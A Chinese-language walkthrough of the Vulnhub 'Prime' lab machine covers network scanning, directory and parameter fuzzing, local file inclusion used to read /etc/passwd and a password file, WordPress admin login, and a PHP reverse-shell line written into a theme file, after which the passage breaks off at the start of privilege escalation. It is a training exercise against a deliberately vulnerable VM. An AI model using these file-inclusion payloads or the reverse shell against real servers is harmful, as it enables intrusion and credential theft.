---
title: Vulnhub靶机--Prime
categories: 靶机系列
tags:
- 渗透
- vulnhub
- 提权
---

# Vulnhub靶机--Prime

## 一.主机发现和信息收集

```shell
╭─ /home/kali/Desktop  with root@kali at 22:25:31 ─╮
╰─❯ nmap -sn 192.168.8.0/24                     

Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-29 22:25 EDT
Nmap scan report for 192.168.8.1 (192.168.8.1)
Host is up (0.0066s latency).
MAC Address: 14:D8:64:93:00:07 (TP-Link Technologies)
Nmap scan report for 192.168.8.3 (192.168.8.3)
Host is up (0.0081s latency).
MAC Address: 14:D8:64:9B:2E:7D (TP-Link Technologies)
Nmap scan report for 192.168.8.4 (192.168.8.4)
Host is up (0.0081s latency).
MAC Address: 14:D8:64:AC:1B:D1 (TP-Link Technologies)
Nmap scan report for 192.168.8.5 (192.168.8.5)
Host is up (0.0084s latency).
MAC Address: 14:D8:64:AC:3C:E3 (TP-Link Technologies)
Nmap scan report for 192.168.8.6 (192.168.8.6)
Host is up (0.0065s latency).
MAC Address: 14:D8:64:AC:43:AC (TP-Link Technologies)
Nmap scan report for 192.168.8.7 (192.168.8.7)
Host is up (0.0093s latency).
MAC Address: 14:D8:64:AC:2D:95 (TP-Link Technologies)
Nmap scan report for 192.168.8.8 (192.168.8.8)
Host is up (0.0093s latency).
MAC Address: 14:D8:64:AC:2D:44 (TP-Link Technologies)
Nmap scan report for 192.168.8.9 (192.168.8.9)
Host is up (0.093s latency).
MAC Address: B8:50:D8:D4:B4:93 (Beijing Xiaomi Mobile Software)
Nmap scan report for 192.168.8.10 (192.168.8.10)
Host is up (0.026s latency).
MAC Address: 54:B8:74:0E:0D:1C (GD Midea Air-Conditioning Equipment)
Nmap scan report for 192.168.8.11 (192.168.8.11)
Host is up (0.14s latency).
MAC Address: 28:D1:27:96:13:2B (Beijing Xiaomi Mobile Software)
Nmap scan report for 192.168.8.12 (192.168.8.12)
Host is up (0.14s latency).
MAC Address: B8:50:D8:D1:4E:BF (Beijing Xiaomi Mobile Software)
Nmap scan report for 192.168.8.13 (192.168.8.13)
Host is up (0.016s latency).
MAC Address: 24:27:30:B9:B9:D3 (GD Midea Air-Conditioning Equipment)
Nmap scan report for 192.168.8.15 (192.168.8.15)
Host is up (0.087s latency).
MAC Address: 64:82:14:52:2A:00 (FN-Link Technology)
Nmap scan report for 192.168.8.18 (192.168.8.18)
Host is up (0.0072s latency).
MAC Address: 14:D8:64:AC:2B:A3 (TP-Link Technologies)
Nmap scan report for 192.168.8.20 (192.168.8.20)
Host is up (0.015s latency).
MAC Address: B8:50:D8:D0:65:E4 (Beijing Xiaomi Mobile Software)
Nmap scan report for 192.168.8.21 (192.168.8.21)
Host is up (0.13s latency).
MAC Address: C8:5C:CC:87:FF:1F (Beijing Xiaomi Mobile Software)
Nmap scan report for 192.168.8.22 (192.168.8.22)
Host is up (0.018s latency).
MAC Address: B8:50:D8:D5:48:2B (Beijing Xiaomi Mobile Software)
Nmap scan report for 192.168.8.23 (192.168.8.23)
Host is up (0.14s latency).
MAC Address: 48:27:E2:E8:FD:0C (Espressif)
Nmap scan report for 192.168.8.27 (192.168.8.27)
Host is up (0.059s latency).
MAC Address: C2:83:98:B1:30:E7 (Unknown)
Nmap scan report for 192.168.8.29 (192.168.8.29)
Host is up (0.00030s latency).
MAC Address: 70:08:94:2E:B7:41 (Unknown)
Nmap scan report for 192.168.8.44 (192.168.8.44)
Host is up (0.00051s latency).
MAC Address: 00:0C:29:8B:42:A5 (VMware)
Nmap scan report for 192.168.8.114 (192.168.8.114)
Host is up.
Nmap done: 256 IP addresses (22 hosts up) scanned in 3.37 seconds
```

锁定IP 为 192.168.8.44 

```shell
╭─ /home/kali/Desktop  with root@kali at 22:26:50 ─╮
╰─❯ nmap -sT -p- 192.168.8.44                                                                                                                                                                                  
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-29 22:57 EDT
Nmap scan report for 192.168.8.44 (192.168.8.44)
Host is up (0.0019s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:8B:42:A5 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 5.02 seconds
```

开放了22,80 端口 

深度探测

```shell
╭─ /home/kali/Desktop ····················································································································································· took 5s with root@kali at 22:57:36 ─╮
╰─❯ nmap -sT -sC -O -sV -p 22,80  192.168.8.44                        ─╯
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-29 23:13 EDT
Nmap scan report for 192.168.8.44 (192.168.8.44)
Host is up (0.0019s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8d:c5:20:23:ab:10:ca:de:e2:fb:e5:cd:4d:2d:4d:72 (RSA)
|   256 94:9c:f8:6f:5c:f1:4c:11:95:7f:0a:2c:34:76:50:0b (ECDSA)
|_  256 4b:f6:f1:25:b6:13:26:d4:fc:9e:b0:72:9f:f4:69:68 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: HacknPentest
MAC Address: 00:0C:29:8B:42:A5 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.37 seconds
```

Apache版本为2.4.18 open ssh的版本为OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)

确定渗透优先级：80->22 在实战中，22不优先考虑

UDP端口信息收集：

```shell
╭─ /home/kali/Desktop ··········································································································································· х INT took 4m 40s with root@kali at 00:03:20 ─╮
╰─❯ nmap -sU 192.168.8.44 --min-rate=8000                                                                                                                                                                      
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-30 00:10 EDT
Nmap scan report for 192.168.8.44 (192.168.8.44)
Host is up (0.0015s latency).
Not shown: 994 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
999/udp   closed applix
1124/udp  closed hpvmmcontrol
2345/udp  closed dbm
17184/udp closed unknown
39632/udp closed unknown
45928/udp closed unknown
MAC Address: 00:0C:29:8B:42:A5 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.60 seconds
```

UDP端口确认关闭，接下来使用vuln脚本对其进行基本漏扫

```shell
╭─ /home/kali/Desktop ····························································································································································· with root@kali at 00:10:40 ─╮
╰─❯ nmap --script=vuln 192.168.8.44                                                                                                                                                                            ─╯
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-30 00:15 EDT
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 192.168.8.44 (192.168.8.44)
Host is up (0.0046s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
| http-enum: 
|   /wordpress/: Blog
|_  /wordpress/wp-login.php: Wordpress login page.
MAC Address: 00:0C:29:8B:42:A5 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 345.93 seconds

```

发现两处DOS漏洞，CVE-2007-6750 和  CVE-2011-1002 ，这两处不优先考虑，其二，我们知道了站点使用word press 搭建，这给了我们很好的提示。

至此，第一阶段结束

## 二.Web渗透测试

打开站点：

{% asset_img image-20260630122919130.png %}

当只出现了一张图片的时候，我们第一件事想的是

**1.观察站点的title 看看站点标题有没有泄露信息？**

**2.查看图片内容  图片泄露了什么信息？图片的元数据中含有什么敏感内容？**

**3.查看页面源码 是否包含注释？**

1.该站点的标题是HacknPentest 入侵与渗透测试，只是一个标题，没有任何其他值得关注的信息

2.图片是一个kali的logo，且图中字样与title相符 接下来下载图片查看是否存在元数据泄露：

```shell
╭─ /home/kali/Desktop ····························································································································································· with root@kali at 00:38:06 ─╮
╰─❯ strings hacknpentest.png                                                                                                                                                                                   ─╯
IHDR
        pHYs
OiCCPPhotoshop ICC profile
SgTS
&*!
H3Q5
~<<+"
0IWfH
~<<E
^D$.T
5H1R
T UH
wB a
AHXLXN
XH,#
T071
oUX*
FU3S
x,!k
9C3J3W
1e\k
J'\'Gg
5qo<
&!&KM
;L;L
`ZxZ,
XUZ]
```

可以看到并没有

3.查看界面是否存在注释：

```html
<html>
<title>HacknPentest</title>
<body>
 <img src='hacknpentest.png' alt='hnp security' width="1300" height="595" />
</body>
</html>
```

也没有其他内容，接下来我们来对目录进行扫描

### 2.1 目录爆破

```shell
╭─ /home/kali/Desktop ···················································································································································· took 18s with root@kali at 00:45:27 ─╮

╰─❯ gobuster dir -u "http://192.168.8.44/" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,php.bak,html,htm,html.bak,txt,log,bak,zip,tar.gz,db,sql,old              ─╯
===============================================================

Gobuster v3.8

by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================

[+] Url:                     http://192.168.8.44/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              sql,old,php.bak,html.bak,log,bak,tar.gz,php,html,htm,txt,zip,db

[+] Timeout:                 10s
===============================================================

Starting gobuster in directory enumeration mode
===============================================================

/index.php            (Status: 200) [Size: 136]
/image.php            (Status: 200) [Size: 147]
/wordpress            (Status: 301) [Size: 316] [--> http://192.168.8.44/wordpress/]
/dev                  (Status: 200) [Size: 131]
/javascript           (Status: 301) [Size: 317] [--> http://192.168.8.44/javascript/]
/secret.txt           (Status: 200) [Size: 412]

Progress: 1227268 / 1227268 (100.00%)
===============================================================

Finished
===============================================================


```

得到/index.php /image.php /wordpress /dev /javascript /secret.txt 

查看/dev : 

```shell
╭─ /home/kali/Desktop ················································································································································ took 17m 35s with root@kali at 01:03:19 ─╮
╰─❯ curl http://192.168.8.44/dev                                                                                                                                                                               ─╯
hello,

now you are at level 0 stage.

In real life pentesting we should use our tools to dig on a web very hard.

Happy hacking.
```

```
你好,

现在你正处于0级阶段。

在现实生活中进行测试时,我们应该使用工具来非常努力的深度挖掘web。

快乐的黑客行为。 
```

是一段欢迎词，没有有价值的信息 

查看secret.txt：

```shell
curl http://192.168.8.44/secret.txt
看起来你发现了一些秘密。

好的，我只是想给你提供一些帮助。

对你找到的每个 PHP 页面进行更多的模糊测试（Fuzzing）。如果你找到了正确的参数，请按照以下步骤操作。如果你仍然卡住了，
从这里学习一个基础工具及其在 OSCP 中的良好用法：

https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web


//查看 location.txt，你会找到你的下一步行动//
```

访问http://192.168.8.44/location.txt 发现404 这一块我们暂时不动，获取到了几点信息：

1.可以使用fuzz来模糊测试隐藏参数

2.发现敏感文件**location.txt** 

3.建议我们使用https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web 工具对页面进行模糊测试

4.每个页面上都建议FUZZ一遍

### 2.2Wfuzz进行模糊测试

下面进行模糊测试：

```shell
╭─ /home/kali ················································ with root@kali at 02:29:35 ─╮
╰─❯ wfuzz -c --hh 134 -w /usr/share/wordlists/wfuzz/general/common.txt http://192.168.8.44/index.php\?FUZZ 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************

* Wfuzz 3.1.0 - The Web Fuzzer                         *

********************************************************

Target: http://192.168.8.44/index.php?FUZZ
Total requests: 951

=====================================================================

ID           Response   Lines    Word       Chars       Payload                     
=====================================================================

000000001:   200        7 L      12 W       136 Ch      "@"                         
000000003:   200        7 L      12 W       136 Ch      "01"                        
000000007:   200        7 L      12 W       136 Ch      "10"                        
000000015:   200        7 L      12 W       136 Ch      "2001"                      
000000048:   200        7 L      12 W       136 Ch      "admon"                     
000000047:   200        7 L      12 W       136 Ch      "adminsql"                  
000000044:   200        7 L      12 W       136 Ch      "admin_login"               
000000031:   200        7 L      12 W       136 Ch      "action"                    
000000050:   200        7 L      12 W       136 Ch      "agent"                     
000000045:   200        7 L      12 W       136 Ch      "adminlogon"                
000000046:   200        7 L      12 W       136 Ch      "admin_logon"               
000000049:   200        7 L      12 W       136 Ch      "adsl"                      
000000043:   200        7 L      12 W       136 Ch      "adminlogin"                
000000039:   200        7 L      12 W       136 Ch      "administrat"               
000000038:   200        7 L      12 W       136 Ch      "Admin"                     
000000035:   200        7 L      12 W       136 Ch      "admin"                     
000000042:   200        7 L      12 W       136 Ch      "administrator"             
000000041:   200        7 L      12 W       136 Ch      "Administration"            
000000036:   200        7 L      12 W       136 Ch      "_admin"                    
000000037:   200        7 L      12 W       136 Ch      "admin_"                    
000000040:   200        7 L      12 W       136 Ch      "administration"    


```

先查看Word，Chars  的长度 ， 再进行过滤：

```shell
 --hc/hl/hw/hh N[,N]+      : Hide responses with the specified code/lines/words/chars (Use BBB for taking values from baseline)
```

过滤长度chars的长度的参数是--hh 我们看到136 ch 的频率最多，所以过滤136

```shell
╭─ /home/kali ················································ with root@kali at 02:31:29 ─╮
╰─❯ wfuzz -c --hh 136 -w /usr/share/wordlists/wfuzz/general/common.txt http://192.168.8.44/index.php\?FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************

* Wfuzz 3.1.0 - The Web Fuzzer                         *

********************************************************

Target: http://192.168.8.44/index.php?FUZZ
Total requests: 951

=====================================================================

ID           Response   Lines    Word       Chars       Payload                     
=====================================================================

000000341:   200        7 L      19 W       206 Ch      "file"                      

Total time: 1.296553
Processed Requests: 951
Filtered Requests: 950
Requests/sec.: 733.4831
```

成功获取参数file

```shell
╭─ /home/kali ················································ with root@kali at 02:32:45 ─╮
╰─❯ curl http://192.168.8.44/index.php\?file\=/etc/passwd                                 ─╯
<html>

<title>HacknPentest</title>

<body>
 <img src='hacknpentest.png' alt='hnp security' width="1300" height="595" />
</body>

Do something better <br><br><br><br><br><br>you are digging wrong file</html>
```

### 2.3漏洞利用

看到file参数我们要想到文件包含 尝试包含/etc/passwd 文件 但是发现没有返回任何结果，出现了一段文字：

“做点更好的事，你挖错文件了” 

这时，我们尝试包含上面的location.txt，secret.txt说了

”查看 location.txt，你会找到你的下一步行动“

```shell
╭─ /home/kali ················································ with root@kali at 02:33:39 ─╮
╰─❯ curl http://192.168.8.44/index.php\?file\=location.txt                                ─╯
<html>
<title>HacknPentest</title>
<body>
 <img src='hacknpentest.png' alt='hnp security' width="1300" height="595" />
</body>

Do something better <br><br><br><br><br><br>ok well Now you reah at the exact parameter <br><br>Now dig some more for next one <br>use 'secrettier360' parameter on some other php page for more fun.
</html>

```

有所突破，location.txt 告诉我们使用secrettier360 参数在另一个php页面上，也就是image.php

```shell
╭─ /home/kali ················································ with root@kali at 02:48:48 ─╮
╰─❯ curl http://192.168.8.44/image.php\?secrettier360\=location.txt                       ─╯
<html>

<title>HacknPentest</title>

<body>
 <img src='hacknpentest.png' alt='hnp security' width="1300" height="595" /></p></p></p>
</body>
finaly you got the right parameter<br><br><br><br></html>
```

“最终,你得到了正确的参数” 因此我们的攻击路径是正确的，测试这个参数是否存在文件包含：

```shell
╭─ /home/kali ················································ with root@kali at 02:49:08 ─╮
╰─❯ curl http://192.168.8.44/image.php\?secrettier360\=/etc/passwd                        ─╯
<html>

<title>HacknPentest</title>

<body>
 <img src='hacknpentest.png' alt='hnp security' width="1300" height="595" /></p></p></p>
</body>
finaly you got the right parameter<br><br><br><br>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
victor:x:1000:1000:victor,,,:/home/victor:/bin/bash
mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false
saket:x:1001:1001:find password.txt file in my directory:/home/saket:
sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin
</html>
```

其中saket账户给了我们提示：在它的家目录下存在password.txt ，尝试包含：

```shell
╭─ /home/kali ················································ with root@kali at 02:54:23 ─╮
╰─❯ curl "http://192.168.8.44/image.php?secrettier360=/home/saket/password.txt"           ─╯
<html>

<title>HacknPentest</title>

<body>
 <img src='hacknpentest.png' alt='hnp security' width="1300" height="595" /></p></p></p>
</body>
finaly you got the right parameter<br><br><br><br>follow_the_ippsec
</html>
```

得到密码follow_the_ippsec ,尝试登录有/bin/bash 的 账户：

```shell
╭─ /home/kali ················································ with root@kali at 02:54:27 ─╮
╰─❯ ssh victor@192.168.8.44                                                               ─╯
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
victor@192.168.8.44's password: 
Permission denied, please try again.
victor@192.168.8.44's password: 
Permission denied, please try again.
victor@192.168.8.44's password: 
victor@192.168.8.44: Permission denied (publickey,password).

╭─ /home/kali ································· х 255 took 17s with root@kali at 02:58:01 ─╮
╰─❯ ssh root@192.168.8.44                                                                 ─╯
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
root@192.168.8.44's password: 
Permission denied, please try again.
root@192.168.8.44's password: 
Permission denied, please try again.
root@192.168.8.44's password: 
root@192.168.8.44: Permission denied (publickey,password).

```

均未成功

### 2.4wordpress站点渗透

在前面的nmap扫描结果中我们知道了该站点是worldpress站点，访问http://192.168.8.44/wordpress/ 是一个Blog界面：

{% asset_img image-20260630150813531.png %}

看到wordpress界面我们应该联想到使用wpscan （wordpress专用扫描器） 进行扫描

我们前期拿到了一个密码 ，所以使用-e u 参数枚举可用账户：

```shell
╭─ /home/kali ················································ with root@kali at 02:25:37 ─╮
╰─❯ wpscan --url "http://192.168.8.44/wordpress" -e u                                     ─╯
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
 

[+] URL: http://192.168.8.44/wordpress/ [192.168.8.44]
[+] Started: Tue Jun 30 03:19:06 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.8.44/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.8.44/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.8.44/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.8.44/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.2.2 identified (Insecure, released on 2019-06-18).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.8.44/wordpress/?feed=rss2, <generator>https://wordpress.org/?v=5.2.2</generator>
 |  - http://192.168.8.44/wordpress/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.2.2</generator>

[+] WordPress theme in use: twentynineteen
 | Location: http://192.168.8.44/wordpress/wp-content/themes/twentynineteen/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://192.168.8.44/wordpress/wp-content/themes/twentynineteen/readme.txt
 | [!] The version is out of date, the latest version is 3.1
 | Style URL: http://192.168.8.44/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.4
 | Style Name: Twenty Nineteen
 | Style URI: https://wordpress.org/themes/twentynineteen/
 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.4 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.8.44/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.4, Match: 'Version: 1.4'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <===============> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] victor
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Jun 30 03:19:08 2026
[+] Requests Done: 24
[+] Cached Requests: 35
[+] Data Sent: 6.527 KB
[+] Data Received: 37.89 KB
[+] Memory used: 180 MB
[+] Elapsed time: 00:00:01
```

存在victor 账户，或者浏览网页：

{% asset_img image-20260630153430698.png %}

使用victor/follow_the_ippsec  登录wordoress后台 ，wordpress默认登录路径：http://192.168.8.44/wordpress/wp-admin/ （这里偷了个懒，应该做目录爆破的）

{% asset_img image-20260630154414090.png %}

## 三.GET SHELL

**wordpress的几个常见渗透思路：**

**1.上传恶意插件，GET SHELL**

**2.编辑主题文件GET SHELL**

3.媒体界面的文件上传

先尝试第一个思路：上传恶意插件，这个是最经典的也是最常用的，通常来说，插件一般为ZIP格式：

{% asset_img image-20260630155626134.png %}

提示无法创建路径，目录可能无权限

尝试第二个思路：编辑网页文件GET SHELL

{% asset_img image-20260630163349098.png %}

发现大多数文件都没有可写入权限，在最底下发现了一个secret.php的文件，且可被编辑：

```
/* Ohh Finaly you got a writable file */
```

写入反弹shell

```php
/* Ohh Finaly you got a writable file */
<?php
system("busybox nc 192.168.8.114 443 -e sh");
?>
```

访问http://192.168.8.44/wordpress/wp-content/themes/twentynineteen/secret.php

shell成功被反弹

```shell
╭─ /home/kali ·························································· with root@kali at 04:39:04 ─╮
╰─❯ nc -lvp 443                                                                                     ─╯
listening on [any] 443 ...
connect to [192.168.8.114] from 192.168.8.44 [192.168.8.44] 54694
ls
404.php
archive.php
classes
comments.php
fonts
footer.php
functions.php
header.php
image.php
inc
index.php
js
package-lock.json
package.json
page.php
postcss.config.js
print.css
print.scss
readme.txt
sass
screenshot.png
search.php
secret.php
single.php
style-editor-customizer.css
style-editor-customizer.scss
style-editor.css
style-editor.scss
style-rtl.css
style.css
style.scss
template-parts
```

## 四.权限提升

使用sudo -l 查看可以无密码即可以超级用户权限执行的文件：

```shell
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (root) NOPASSWD: /home/saket/enc
```

file /home/saket/enc 发现是一个linux下的可执行文件  暂时先放着

查看home下有什么文件：

```shell
www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$ ls /home
saket  victor
www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$ 
```

查看/home/victor 和 /home/saket

 /home/victor无权限 /home/saket 下有三个文件 user.txt 和 enc 和password.txt user.txt是user下的flag，使用strings 提取enc的有效字符也失败了

```
www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$ ls /home/saket 
enc password.txt  user.txt
www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$ 
```

查看内核版本，可以看到内核比较老，是一个潜在的攻击面

```shell
www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$ uname -a
Linux ubuntu 4.10.0-28-generic #32~16.04.2-Ubuntu SMP Thu Jul 20 10:19:48 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$ 
```

查看/etc/crontab

```shell
www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
@reboot                 bash /root/t.sh
#
www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$ 


```

并没有实际有帮助的内容

接下来我们深入内核提权：

```shell
╭─ /home/kali ················································ with root@kali at 03:19:08 ─╮
╰─❯ searchsploit Linux ubuntu 4.10.0-28                                                   ─╯

----------------------------------------------------------- ---------------------------------

 Exploit Title                                             |  Path

----------------------------------------------------------- ---------------------------------

